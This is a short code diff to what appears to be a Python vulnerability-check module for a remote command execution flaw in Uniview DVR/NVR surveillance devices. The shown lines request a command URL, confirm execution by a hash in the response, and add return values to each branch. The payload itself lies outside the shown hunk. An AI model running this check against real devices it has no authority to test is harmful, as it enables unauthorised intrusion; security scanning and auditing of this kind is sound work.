@@ -27,11 +27,14 @@ class camera_uniview_dvr_rce_BaseVerify:
             req2 = requests.get(cmdurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
                 cprint("[+]存在浙江宇视（DVR/NCR）监控设备远程命令执行漏洞...(高危)\tpayload: "+vulnurl+"\tcmdurl: "+cmdurl, "red")
+                return True, vulnurl, "浙江宇视（DVR/NCR）监控设备远程命令执行漏洞", payload, req.text
             else:
                 cprint("[-]不存在camera_uniview_dvr_rce漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
